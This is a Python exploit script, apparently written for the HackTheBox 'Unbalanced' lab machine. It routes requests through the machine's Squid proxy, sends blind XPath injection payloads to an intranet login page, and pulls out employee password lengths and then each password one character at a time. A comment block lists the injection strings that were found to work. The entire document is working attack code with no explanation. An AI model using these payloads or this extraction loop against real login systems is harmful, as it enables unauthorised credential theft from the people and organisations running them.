import requests

proxies = {
        "http": "http://unbalanced.htb:3128",
          }

url = "http://172.31.179.1/intranet.php"

'''
working:
front = "a' or count(//Password)="
front = "a' or count(//Employee)="
front = "a' or count(//Employee/Password)="
front = "a' or string-length(substring(//Employee[position()=4]/Password,1))="
front = "a' or substring(//Employee[position()=3]/Username,1,1)='"
end = "' or 'a'='"
'''


def search_letter(pos,idx):
    l_front = "a' or substring(//Employee[position()="+idx+"]/Password,"+pos+",1)='"
    l_end = "' or 'a'='"

    for i in range(0xff):
        guess = chr(i)
        p = l_front + guess + l_end
        d = {
                "Username": p,
                "Password": p,
        }

        r = requests.post(url, proxies=proxies,data=d)
        if 'rita' in r.text:
            return guess

def search_count(target):
    l_front = "a' or string-length(substring(//Employee[position()="+target +"]/Password,1))="
    l_end = " or 'a'='"
    for i in range(100):
        guess = str(i)
        p = l_front + guess + l_end
        d = {
                "Username": p,
                "Password": p,
        }

        r = requests.post(url, proxies=proxies,data=d)
        if 'rita' in r.text:
            return i

for j in range(4):
    idx = str(j+1)
    p_len = search_count(idx)
    bingo = ""
    for i in range(p_len):
        bingo += search_letter(str(i+1),idx)
        print(bingo)
